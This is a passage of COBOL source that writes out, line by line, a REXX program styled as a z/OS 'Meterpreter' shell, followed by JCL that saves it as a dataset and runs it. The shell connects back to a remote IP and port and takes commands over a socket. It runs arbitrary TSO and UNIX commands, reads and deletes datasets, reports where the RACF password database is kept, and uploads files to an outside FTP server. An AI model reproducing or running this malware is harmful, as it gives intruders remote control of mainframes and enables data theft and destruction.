     MOVE 'commando:  /* GE
-    T IN DA CHOPPA */'
-    TO WS-LINE(362)
     MOVE 'parse arg s
-    ocket_to_use'
-    TO WS-LINE(363)
     MOVE '/* get co
-    mmands */'
-    TO WS-LINE(364)
     MOVE '     chop
-    pa = '''''
-    TO WS-LINE(365)
     MOVE '     sox = SOCKET(''REC
-    V'',socket_to_use,10000)'
-    TO WS-LINE(366)
     MOVE '     parse var sox s_rc s_
-    type s_port s_ip s_results'
-    TO WS-LINE(367)
     MOVE '     parse var sox s_rc
-     s_data_len s_data_text'
-    TO WS-LINE(368)
     MOVE '     if s_r
-    c <> 0 then'
-    TO WS-LINE(369)
     MOVE '   
-      do'
-    TO WS-LINE(370)
     MOVE '        if verbose then sa
-    y "[!] Couldn''t get data"'
-    TO WS-LINE(371)
     MOVE '        CALL D
-    AVID_COULIER(1)'
-    TO WS-LINE(372)
     MOVE '    
-     end'
-    TO WS-LINE(373)
     MOVE '     /* Strip off the last b
-    yte cause it''s all weird */'
-    TO WS-LINE(374)
     MOVE '     chopper = DELSTR(s_dat
-    a_text, LENGTH(s_data_text))'
-    TO WS-LINE(375)
     MOVE '  return
-     chopper'
-    TO WS-LINE(376)
     MOVE '
-    '
-    TO WS-LINE(377)
     MOVE '
-    '
-    TO WS-LINE(378)
     MOVE 'GET_UID: /* ret
-    urns the UID */'
-    TO WS-LINE(379)
     MOVE '   text = NEWLINE||"Mainframe
-     userID: "||userid()||NEWLINE'
-    TO WS-LINE(380)
     MOVE '   retu
-    rn text'
-    TO WS-LINE(381)
     MOVE '
-    '
-    TO WS-LINE(382)
     MOVE 'GET_IP
-    _INFO:'
-    TO WS-LINE(383)
     MOVE '/* Uses TSO command ''netsta
-    t home'' to get IP config */'
-    TO WS-LINE(384)
     MOVE '/* Requires T
-    SO segment */'
-    TO WS-LINE(385)
     MOVE '   x = OUTTR
-    AP(''var.'')'
-    TO WS-LINE(386)
     MOVE '   address tso 
-     "NETSTAT HOME"'
-    TO WS-LINE(387)
     MOVE '   parse var var.1 a1 a2
-     a3 a4 a5 a6 a7 a8 type .'
-    TO WS-LINE(388)
     MOVE '   text = NEWLINE||"TCP
-    /IP Name:" type||NEWLINE'
-    TO WS-LINE(389)
     MOVE '   IPADDR = SOCK
-    ET(''GETHOSTID'')'
-    TO WS-LINE(390)
     MOVE '   parse var IPA
-    DDR ip_rc ip_addr'
-    TO WS-LINE(391)
     MOVE '  text = text||"Connected using IP A
-    ddress: "||ip_addr||NEWLINE||NEWLINE'
-    TO WS-LINE(392)
     MOVE '   j
-     = 1'
-    TO WS-LINE(393)
     MOVE '   DO i = 
-    5 TO var.0'
-    TO WS-LINE(394)
     MOVE '       parse var var.i ga
-    rbage ip_addr link flag_sp'
-    TO WS-LINE(395)
     MOVE '       flag = S
-    PACE(flag_sp,0)'
-    TO WS-LINE(396)
     MOVE '       text = text||"Interface "||
-    j||NEWLINE||"=========="||NEWLINE,'
-    TO WS-LINE(397)
     MOVE '       "Name        
-     : "||link||NEWLINE,'
-    TO WS-LINE(398)
     MOVE '       "IPv4 Address 
-    : "||ip_addr||NEWLINE,'
-    TO WS-LINE(399)
     MOVE '       "Flag         : "
-    ||flag||NEWLINE||NEWLINE'
-    TO WS-LINE(400)
     MOVE '       j
-     = j + 1'
-    TO WS-LINE(401)
     MOVE '   
-    end'
-    TO WS-LINE(402)
     MOVE '   x = OU
-    TTRAP(OFF)'
-    TO WS-LINE(403)
     MOVE ' retur
-    n text'
-    TO WS-LINE(404)
     MOVE '
-    '
-    TO WS-LINE(405)
     MOVE 'GET_R
-    ACFDB:'
-    TO WS-LINE(406)
     MOVE '/* Gets the dataset (aka file
-    ) name of the RACF database */'
-    TO WS-LINE(407)
     MOVE '/* This requires
-     a TSO segment */'
-    TO WS-LINE(408)
     MOVE '   x = OUTTR
-    AP(''var.'')'
-    TO WS-LINE(409)
     MOVE '   address ts
-    o "RVARY LIST"'
-    TO WS-LINE(410)
     MOVE '   parse var var.4 active1 u
-    se1 num1 volume1 dataset1_sp'
-    TO WS-LINE(411)
     MOVE '   parse var var.5 active2 u
-    se2 num2 volume2 dataset2_sp'
-    TO WS-LINE(412)
     MOVE '   dataset1 = SPA
-    CE(dataset1_sp,0)'
-    TO WS-LINE(413)
     MOVE '   dataset2 = SPA
-    CE(dataset2_sp,0)'
-    TO WS-LINE(414)
     MOVE '   if use1 = 
-    ''PRIM'' then'
-    TO WS-LINE(415)
     MOVE '     text = NEWLINE||"Primary"
-    ||NEWLINE||"========"||NEWLINE'
-    TO WS-LINE(416)
     MOVE '   
-    else'
-    TO WS-LINE(417)
     MOVE '     text = NEWLINE||"Backup"
-    ||NEWLINE||"========"||NEWLINE'
-    TO WS-LINE(418)
     MOVE '
-    '
-    TO WS-LINE(419)
     MOVE '     text = text||" Active
-        : "||active1||NEWLINE,'
-    TO WS-LINE(420)
     MOVE '            "FileName  : "|
-    |dataset1||NEWLINE||NEWLINE'
-    TO WS-LINE(421)
     MOVE '   if use2 = 
-    ''PRIM'' then'
-    TO WS-LINE(422)
     MOVE '     text = text||"Primary"|
-    |NEWLINE||"========"||NEWLINE'
-    TO WS-LINE(423)
     MOVE '   
-    else'
-    TO WS-LINE(424)
     MOVE '     text = text||"Backup"||
-    NEWLINE||"========"||NEWLINE'
-    TO WS-LINE(425)
     MOVE '
-    '
-    TO WS-LINE(426)
     MOVE '     text = text||" Active
-        : "||active2||NEWLINE,'
-    TO WS-LINE(427)
     MOVE '                  "Filena
-    me  : "||dataset2||NEWLINE'
-    TO WS-LINE(428)
     MOVE '   x = OU
-    TTRAP(OFF)'
-    TO WS-LINE(429)
     MOVE '   retu
-    rn text'
-    TO WS-LINE(430)
     MOVE '
-    '
-    TO WS-LINE(431)
     MOVE 'UNIX_C
-    OMMAND:'
-    TO WS-LINE(432)
     MOVE '/* Executes a UNIX c
-    ommand (aka OMVS) */'
-    TO WS-LINE(433)
     MOVE '    parse arg
-     unix_command'
-    TO WS-LINE(434)
     MOVE '    CALL BPXWUNIX 
-    unix_command,,out.'
-    TO WS-LINE(435)
     MOVE '    text = ''''||NEWLI
-    NE /* blank out text */'
-    TO WS-LINE(436)
     MOVE '    DO i =
-     1 TO out.0'
-    TO WS-LINE(437)
     MOVE '       text = tex
-    t||out.i||NEWLINE'
-    TO WS-LINE(438)
     MOVE '   
-     END'
-    TO WS-LINE(439)
     MOVE '  retu
-    rn text'
-    TO WS-LINE(440)
     MOVE '
-    '
-    TO WS-LINE(441)
     MOVE 'TSO_CO
-    MMAND:'
-    TO WS-LINE(442)
     MOVE '/* outputs the result
-    s of a TSO command */'
-    TO WS-LINE(443)
     MOVE '   parse 
-    arg tso_do'
-    TO WS-LINE(444)
     MOVE '   text = NEWLINE||"Issuing T
-    SO Command: "||tso_do||NEWLINE'
-    TO WS-LINE(445)
     MOVE '   u = OUTTRAP
-    (''tso_out.'')'
-    TO WS-LINE(446)
     MOVE '   ADDRESS
-     TSO tso_do'
-    TO WS-LINE(447)
     MOVE '   u = OU
-    TTRAP(OFF)'
-    TO WS-LINE(448)
     MOVE '   DO i = 1 
-    to tso_out.0'
-    TO WS-LINE(449)
     MOVE '      text = text|
-    |tso_out.i||NEWLINE'
-    TO WS-LINE(450)
     MOVE '   
-    END'
-    TO WS-LINE(451)
     MOVE ' retur
-    n text'
-    TO WS-LINE(452)
     MOVE '
-    '
-    TO WS-LINE(453)
     MOVE 'GET_OS
-    _INFO:'
-    TO WS-LINE(454)
     MOVE '/* z/OS Operating S
-    ystem Information */'
-    TO WS-LINE(455)
     MOVE '/* Lots of help from th
-    e LPINFO script from */'
-    TO WS-LINE(456)
     MOVE '/* www.longpelaex
-    pertise.com.au */'
-    TO WS-LINE(457)
     MOVE '   cvtaddr = g
-    et_dec_addr(16)'
-    TO WS-LINE(458)
     MOVE '   zos_name = Strip(Stor
-    age(D2x(cvtaddr+340),8))'
-    TO WS-LINE(459)
     MOVE '   ecvtaddr = get_d
-    ec_addr(cvtaddr+140)'
-    TO WS-LINE(460)
     MOVE '   zos_ver = Strip(Stora
-    ge(D2x(ecvtaddr+512),2))'
-    TO WS-LINE(461)
     MOVE '   zos_rel = Strip(Stora
-    ge(D2x(ecvtaddr+514),2))'
-    TO WS-LINE(462)
     MOVE '   sysplex = Strip(Stor
-    age(D2x(ecvtaddr+8),8))'
-    TO WS-LINE(463)
     MOVE '   jes_p = SYS
-    VAR(''SYSJES'')'
-    TO WS-LINE(464)
     MOVE '   parse var
-     jes_p jes .'
-    TO WS-LINE(465)
     MOVE '   jes_node = jes||'' (Node: '
-    '|| SYSVAR(''SYSNODE'')||'')'''
-    TO WS-LINE(466)
     MOVE '   security_node = get_se
-    curity_system(cvtaddr+992)'
-    TO WS-LINE(467)
     MOVE '   text =
-     NEWLINE,'
-    TO WS-LINE(468)
     MOVE '       "Computer    : LP
-    AR "|| zos_name||NEWLINE,'
-    TO WS-LINE(469)
     MOVE '       "Sysplex     :
-     "||sysplex||NEWLINE,'
-    TO WS-LINE(470)
     MOVE '       "OS          : z/OS" 
-    zos_ver||.||zos_rel||NEWLINE,'
-    TO WS-LINE(471)
     MOVE '       "Job Entry   :
-     "||jes_node||NEWLINE,'
-    TO WS-LINE(472)
     MOVE '       "Security    : "|
-    |security_node||NEWLINE,'
-    TO WS-LINE(473)
     MOVE '       "Meterpreter 
-    : z/OS REXX"||NEWLINE'
-    TO WS-LINE(474)
     MOVE '   retu
-    rn text'
-    TO WS-LINE(475)
     MOVE '
-    '
-    TO WS-LINE(476)
     MOVE 'get_dec_addr: /* Need
-    ed for GET_OS_INFO */'
-    TO WS-LINE(477)
     MOVE '     pars
-    e arg addr'
-    TO WS-LINE(478)
     MOVE '     hex_add
-    r = d2x(addr)'
-    TO WS-LINE(479)
     MOVE '     stor = Sto
-    rage(hex_addr,4)'
-    TO WS-LINE(480)
     MOVE '     hex_sto
-    r = c2x(stor)'
-    TO WS-LINE(481)
     MOVE '     value = 
-    x2d(hex_stor)'
-    TO WS-LINE(482)
     MOVE '  retur
-    n value'
-    TO WS-LINE(483)
     MOVE 'get_security_system:  /* 
-    needed for GET_OS_INFO */'
-    TO WS-LINE(484)
     MOVE '     parse 
-    arg sec_addr'
-    TO WS-LINE(485)
     MOVE '     cvtrac = get_
-    dec_addr(sec_addr)'
-    TO WS-LINE(486)
     MOVE '     rcvtid = Stor
-    age(d2x(cvtrac),4)'
-    TO WS-LINE(487)
     MOVE '     if rcvtid = ''RCVT
-    '' then return ''RACF'''
-    TO WS-LINE(488)
     MOVE '     if rcvtid = ''RTSS'' t
-    hen return ''CA Top Secret'''
-    TO WS-LINE(489)
     MOVE '     if rcvtid = ''ACF2'
-    ' then return ''CA ACF2'''
-    TO WS-LINE(490)
     MOVE '   re
-    turn 0'
-    TO WS-LINE(491)
     MOVE '
-    '
-    TO WS-LINE(492)
     MOVE 'CAT_
-    FILE:'
-    TO WS-LINE(493)
     MOVE '/* Cats a file and retu
-    rns it to the screen */'
-    TO WS-LINE(494)
     MOVE '  parse a
-    rg meow .'
-    TO WS-LINE(495)
     MOVE '  cat = S
-    TRIP(meow)'
-    TO WS-LINE(496)
     MOVE '  ADDRESS TSO "ALLOC F(inte
-    mp) DSN(''"||cat||"'') SHR"'
-    TO WS-LINE(497)
     MOVE '  ADDRESS TSO "EXECIO * DISK
-    R intemp (FINIS STEM TIGER."'
-    TO WS-LINE(498)
     MOVE '  ADDRESS TSO "f
-    ree file(intemp)"'
-    TO WS-LINE(499)
     MOVE '  text = NEWLINE||''F
-    ile: ''||meow||NEWLINE'
-    TO WS-LINE(500)
     MOVE '  text = text||''File Len
-    gth: ''||TIGER.0||NEWLINE'
-    TO WS-LINE(501)
     MOVE '  DO i = 1
-     TO TIGER.0'
-    TO WS-LINE(502)
     MOVE '      text = text
-    ||TIGER.i||NEWLINE'
-    TO WS-LINE(503)
     MOVE '
-    '
-    TO WS-LINE(504)
     MOVE '  
-    END'
-    TO WS-LINE(505)
     MOVE ' retur
-    n text'
-    TO WS-LINE(506)
     MOVE '
-    '
-    TO WS-LINE(507)
     MOVE 'CP: /* Uses a JCL to copy
-     one file to the other */'
-    TO WS-LINE(508)
     MOVE '    parse arg
-     from_DS to_DS'
-    TO WS-LINE(509)
     MOVE '    IF to_DS
-     = '''' THEN'
-    TO WS-LINE(510)
     MOVE '   
-     DO'
-    TO WS-LINE(511)
     MOVE '      text = NEWLINE||"cp comm
-    and requires a to and a from.",'
-    TO WS-LINE(512)
     MOVE '             "You only sup
-    plied: "||from_DS||NEWLINE'
-    TO WS-LINE(513)
     MOVE '      re
-    turn text'
-    TO WS-LINE(514)
     MOVE '   
-     END'
-    TO WS-LINE(515)
     MOVE '    DR
-    OPBUF 0'
-    TO WS-LINE(516)
     MOVE '    queue "//CPTHAT
-    S EXEC PGM=IEBGENER"'
-    TO WS-LINE(517)
     MOVE '    queue "//SYSP
-    RINT DD SYSOUT=*"'
-    TO WS-LINE(518)
     MOVE '    queue "//SY
-    SIN    DD DUMMY"'
-    TO WS-LINE(519)
     MOVE '    queue "//SYSUT1   DD D
-    SN="||from_DS||",DISP=SHR"'
-    TO WS-LINE(520)
     MOVE '    queue "//SYSUT2  
-     DD DSN="||to_DS||","'
-    TO WS-LINE(521)
     MOVE '    queue "//     L
-    IKE="||from_DS||","'
-    TO WS-LINE(522)
     MOVE '    queue "//     DIS
-    P=(NEW,CATLG,DELETE),"'
-    TO WS-LINE(523)
     MOVE '    queue "// 
-        UNIT=SYSDA"'
-    TO WS-LINE(524)
     MOVE '    que
-    ue "/*"'
-    TO WS-LINE(525)
     MOVE '    que
-    ue "@#"'
-    TO WS-LINE(526)
     MOVE '    v = OUTT
-    RAP(''sub.'')'
-    TO WS-LINE(527)
     MOVE '    ADDRESS TSO
-     "SUB * END(@#)"'
-    TO WS-LINE(528)
     MOVE '    v = OU
-    TTRAP(OFF)'
-    TO WS-LINE(529)
     MOVE '  text = NEWLINE||"File "||from_D
-    S||" copying to "||to_DS||NEWLINE'
-    TO WS-LINE(530)
     MOVE '  retu
-    rn text'
-    TO WS-LINE(531)
     MOVE '
-    '
-    TO WS-LINE(532)
     MOVE 'DEL
-    ETE:'
-    TO WS-LINE(533)
     MOVE '    /* Deletes a file
-     or dataset member */'
-    TO WS-LINE(534)
     MOVE '    parse ar
-    g deleteme .'
-    TO WS-LINE(535)
     MOVE '    IF delete
-    me = '''' THEN'
-    TO WS-LINE(536)
     MOVE '   
-     DO'
-    TO WS-LINE(537)
     MOVE '      text = NEWLINE||"You didn
-    ''t supply a dataset to delete"'
-    TO WS-LINE(538)
     MOVE '      re
-    turn text'
-    TO WS-LINE(539)
     MOVE '   
-     END'
-    TO WS-LINE(540)
     MOVE '    d = OUTTR
-    AP(''tdel.'')'
-    TO WS-LINE(541)
     MOVE '    ADDRESS TSO "DELE
-    TE ''"||deleteme||"''"'
-    TO WS-LINE(542)
     MOVE '    /* if you don''t put '''' around
-     a dataset it prepends your userid */'
-    TO WS-LINE(543)
     MOVE '    d = OU
-    TTRAP(OFF)'
-    TO WS-LINE(544)
     MOVE '    text 
-    = NEWLINE'
-    TO WS-LINE(545)
     MOVE '    DO i = 
-    1 to tdel.0'
-    TO WS-LINE(546)
     MOVE '      text = text
-    ||NEWLINE||tdel.i'
-    TO WS-LINE(547)
     MOVE '   
-     END'
-    TO WS-LINE(548)
     MOVE '  retu
-    rn text'
-    TO WS-LINE(549)
     MOVE '
-    '
-    TO WS-LINE(550)
     MOVE 'UPLOAD
-    _FILE:'
-    TO WS-LINE(551)
     MOVE '/* Uploads a file from the m
-    ainframe to an FTP server */'
-    TO WS-LINE(552)
     MOVE '/* It submits a JOB wh
-    ich uploads the file */'
-    TO WS-LINE(553)
     MOVE '/* FYI this doesn''t always wo
-    rk with a debian FTP server */'
-    TO WS-LINE(554)
     MOVE '    parse arg ftp_server user
-    name password dataset binary .'
-    TO WS-LINE(555)
     MOVE '    DROPBUF 0 /* c
-    lear the buffer */'
-    TO WS-LINE(556)
     MOVE '    queue "//FTP  
-        EXEC PGM=FTP,"'
-    TO WS-LINE(557)
     MOVE '    queue "//         PARM=
-    ''"||ftp_server||" (EXIT'' "'
-    TO WS-LINE(558)
     MOVE '    queue "//SYSMD
-    UMP DD   SYSOUT=* "'
-    TO WS-LINE(559)
     MOVE '    queue "//SYSPR
-    INT DD   SYSOUT=* "'
-    TO WS-LINE(560)
     MOVE '    queue "/
-    /INPUT DD * "'
-    TO WS-LINE(561)
     MOVE '    queue
-     username'
-    TO WS-LINE(562)
     MOVE '    queue
-     password'
-    TO WS-LINE(563)
     MOVE '    if binary = "binary"
-     then queue put "binary"'
-    TO WS-LINE(564)
     MOVE '    queue "put '
-    '"||dataset||"''"'
-    TO WS-LINE(565)
     MOVE '    queu
-    e "quit "'
-    TO WS-LINE(566)
     MOVE '    que
-    ue "/*"'
-    TO WS-LINE(567)
     MOVE '    que
-    ue "@#"'
-    TO WS-LINE(568)
     MOVE '    ADDRESS TSO
-     "SUB * END(@#)"'
-    TO WS-LINE(569)
     MOVE '    text = NEWLINE||"Uploading fi
-    le "||dataset||" to "||ftp_server,'
-    TO WS-LINE(570)
     MOVE '           "using use
-    r name"||username||"."'
-    TO WS-LINE(571)
     MOVE '    if binary 
-    = "binary" then'
-    TO WS-LINE(572)
     MOVE '        text = text||" Us
-    ing Binary transfer mode."'
-    TO WS-LINE(573)
     MOVE '    
-    else'
-    TO WS-LINE(574)
     MOVE '        text = text||" Not 
-    using Binary transfer mode."'
-    TO WS-LINE(575)
     MOVE '  retu
-    rn text'
-    TO WS-LINE(576)
     MOVE '
-    '
-    TO WS-LINE(577)
     MOVE 'L
-    S:'
-    TO WS-LINE(578)
     MOVE '/* Lists datasets given a h
-    igh level qualifier (hlq) */'
-    TO WS-LINE(579)
     MOVE '    parse arg s
-    uckit, hilevel .'
-    TO WS-LINE(580)
     MOVE '    filez = S
-    TRIP(hilevel)'
-    TO WS-LINE(581)
     MOVE '    IF filez = '''' 
-    then filez = USERID()'
-    TO WS-LINE(582)
     MOVE '    hedr = NEWLINE||" Listing 
-    Files: " filez||".*"||NEWLINE,'
-    TO WS-LINE(583)
     MOVE '           "===================
-    ======================"||NEWLINE'
-    TO WS-LINE(584)
     MOVE '    terp = SOCKET(''
-    SEND'',suckit, hedr)'
-    TO WS-LINE(585)
     MOVE '    text 
-    = NEWLINE'
-    TO WS-LINE(586)
     MOVE '    b = OUTTRA
-    P(''ls_cmd.'')'
-    TO WS-LINE(587)
     MOVE '    ADDRESS TSO "LIST
-    C LEVEL("||filez||")"'
-    TO WS-LINE(588)
     MOVE '    b = OU
-    TTRAP(OFF)'
-    TO WS-LINE(589)
     MOVE '    fi
-    led = 1'
-    TO WS-LINE(590)
     MOVE '    DO i = 1
-     to ls_cmd.0'
-    TO WS-LINE(591)
     MOVE '       IF 
-    filed THEN'
-    TO WS-LINE(592)
     MOVE '     
-       DO'
-    TO WS-LINE(593)
     MOVE '          text = tex
-    t||ls_cmd.i||NEWLINE'
-    TO WS-LINE(594)
     MOVE '         
-     filed = 0'
-    TO WS-LINE(595)
     MOVE '     
-       END'
-    TO WS-LINE(596)
     MOVE '     
-      ELSE'
-    TO WS-LINE(597)
     MOVE '         
-     filed = 1'
-    TO WS-LINE(598)
     MOVE '   
-     END'
-    TO WS-LINE(599)
     MOVE '
-    '
-    TO WS-LINE(600)
     MOVE '  retu
-    rn text'
-    TO WS-LINE(601)
     MOVE '
-    '
-    TO WS-LINE(602)
     MOVE 'LS_ME
-    MBERS:'
-    TO WS-LINE(603)
     MOVE '/* Lists datasets given a ''h
-    igh level qualifier, or HLQ */'
-    TO WS-LINE(604)
     MOVE '    parse arg
-     hilevelmem .'
-    TO WS-LINE(605)
     MOVE '    text 
-    = NEWLINE'
-    TO WS-LINE(606)
     MOVE '    x = OUTTRA
-    P(''members.'')'
-    TO WS-LINE(607)
     MOVE '    ADDRESS TSO "LISTDS ''
-    "||hilevelmem||"'' members"'
-    TO WS-LINE(608)
     MOVE '    x = OU
-    TTRAP(OFF)'
-    TO WS-LINE(609)
     MOVE '    DO i = 7
-     TO members.0'
-    TO WS-LINE(610)
     MOVE '       members.i 
-    = STRIP(members.i)'
-    TO WS-LINE(611)
     MOVE '       text = text||''--> ''||hilev
-    elmem||"("||members.i||")"||NEWLINE'
-    TO WS-LINE(612)
     MOVE '   
-     END'
-    TO WS-LINE(613)
     MOVE '  retu
-    rn text'
-    TO WS-LINE(614)
     MOVE '
-    '
-    TO WS-LINE(615)
     MOVE 'UPP
-    ER:'
-    TO WS-LINE(616)
     MOVE '/* Of all the built-in functio
-    ns, this isn''t one of them */'
-    TO WS-LINE(617)
     MOVE '    PARSE UPPE
-    R ARG STRINGED'
-    TO WS-LINE(618)
     MOVE '    retur
-    n STRINGED'
-    TO WS-LINE(619)
     MOVE '
-    '
-    TO WS-LINE(620)
     MOVE 'GET_
-    HELP:'
-    TO WS-LINE(621)
     MOVE '/* Help c
-    ommand */'
-    TO WS-LINE(622)
     MOVE '       help
-     = NEWLINE,'
-    TO WS-LINE(623)
     MOVE '       "Core Com
-    mands"||NEWLINE,'
-    TO WS-LINE(624)
     MOVE '       "============
-    ="||NEWLINE||NEWLINE,'
-    TO WS-LINE(625)
     MOVE '       "  Command        
-       Description"||NEWLINE,'
-    TO WS-LINE(626)
     MOVE '       "  -------        
-       -----------"||NEWLINE,'
-    TO WS-LINE(627)
     MOVE '       "  help          
-        Help Menu"||NEWLINE,'
-    TO WS-LINE(628)
     MOVE '       "  exit              Te
-    rminate the session"||NEWLINE,'
-    TO WS-LINE(629)
     MOVE '       "  quit              Te
-    rminate the session"||NEWLINE,'
-    TO WS-LINE(630)
     MOVE '       NEWLI
-    NE||NEWLINE,'
-    TO WS-LINE(631)
     MOVE '       "Filesystem 
-    Commands"||NEWLINE,'
-    TO WS-LINE(632)
     MOVE '       "===============
-    ===="||NEWLINE||NEWLINE,'
-    TO WS-LINE(633)
     MOVE '       "  Command        
-       Description"||NEWLINE,'
-    TO WS-LINE(634)
     MOVE '       "  -------        
-       -----------"||NEWLINE,'
-    TO WS-LINE(635)
     MOVE '       "  cat               Sho
-    w contents of dataset"||NEWLINE,'
-    TO WS-LINE(636)
     MOVE '       "  cp                copie
-    s a file to a new file"||NEWLINE,'
-    TO WS-LINE(637)
     MOVE '       "  ls                l
-    ist datasets in HLQ"||NEWLINE,'
-    TO WS-LINE(638)
     MOVE '       "  delete          
-      deletes a file"||NEWLINE,'
-    TO WS-LINE(639)
     MOVE '       "  del               a
-    lso deletes a file"||NEWLINE,'
-    TO WS-LINE(640)
     MOVE '       "  lsmem             Lis
-    ts files and members"||NEWLINE,'
-    TO WS-LINE(641)
     MOVE '       "                    !!WARN
-    ING!! Takes time and IO"||NEWLINE,'
-    TO WS-LINE(642)
     MOVE '       NEWLI
-    NE||NEWLINE,'
-    TO WS-LINE(643)
     MOVE '       "Networking 
-    Commands"||NEWLINE,'
-    TO WS-LINE(644)
     MOVE '       "===============
-    ===="||NEWLINE||NEWLINE,'
-    TO WS-LINE(645)
     MOVE '       "  Command        
-       Description"||NEWLINE,'
-    TO WS-LINE(646)
     MOVE '       "  -------        
-       -----------"||NEWLINE,'
-    TO WS-LINE(647)
     MOVE '       "  ipconfig          
-    Display interfaces"||NEWLINE,'
-    TO WS-LINE(648)
     MOVE '       "  ifconfig          
-    Display interfaces"||NEWLINE,'
-    TO WS-LINE(649)
     MOVE '       NEWLI
-    NE||NEWLINE,'
-    TO WS-LINE(650)
     MOVE '       "System Co
-    mmands"||NEWLINE,'
-    TO WS-LINE(651)
     MOVE '       "=============
-    =="||NEWLINE||NEWLINE,'
-    TO WS-LINE(652)
     MOVE '       "  Command        
-       Description"||NEWLINE,'
-    TO WS-LINE(653)
     MOVE '       "  -------        
-       -----------"||NEWLINE,'
-    TO WS-LINE(654)
     MOVE '       "  getuid            Ge
-    t current user name"||NEWLINE,'
-    TO WS-LINE(655)
     MOVE '       "  sysinfo           Remot
-    e system info (i.e OS)"||NEWLINE,'
-    TO WS-LINE(656)
     MOVE '       "  racf              Sh
-    ow password database location",'
-    TO WS-LINE(657)
     MOVE '       
-    NEWLINE,'
-    TO WS-LINE(658)
     MOVE '       "  execute           Ex
-    ecute a TSO command"||NEWLINE,'
-    TO WS-LINE(659)
     MOVE '       "  tso               Execu
-    te TSO command (same as execute)",'
-    TO WS-LINE(660)
     MOVE '       
-    NEWLINE,'
-    TO WS-LINE(661)
     MOVE '       "  unix              UNIX
-     command (i.e ls -al)"||NEWLINE,'
-    TO WS-LINE(662)
     MOVE '       "  ftp               Uplo
-    ad a file from the mainframe to",'
-    TO WS-LINE(663)
     MOVE '       
-    NEWLINE,'
-    TO WS-LINE(664)
     MOVE '       "                    an F
-    TP server. Syntax is:"||NEWLINE,'
-    TO WS-LINE(665)
     MOVE '       "                    host
-    /ip user pass filename [binary]",'
-    TO WS-LINE(666)
     MOVE '       NEWL
-    INE||NEWLINE'
-    TO WS-LINE(667)
     MOVE '     ret
-    urn help'
-    TO WS-LINE(668)
     MOVE '/
-    XX'
-    TO WS-LINE(669)
     MOVE '//SYSUT2   DD DISP=(NEW,CA
-    TLG,DELETE),DSN=DOGE.CATSO,'
-    TO WS-LINE(670)
     MOVE '//         S
-    PACE=(CYL,10)'
-    TO WS-LINE(671)
     MOVE '//RUNCAT  EXE
-    C PGM=IKJEFT01'
-    TO WS-LINE(672)
     MOVE '//SYSTS
-    IN  DD *'
-    TO WS-LINE(673)
     MOVE '  EXEC ''DOGE.CATSO'' '
-    'R 192.168.1.138 1234'''
-    TO WS-LINE(674)
     MOVE '/
-    *'
-    TO WS-LINE(675)
     MOVE '//SYSIN  
-      DD DUMMY'
-    TO WS-LINE(676)
     MOVE '//SYSTSPRT 
-    DD SYSOUT=*'
-    TO WS-LINE(677)
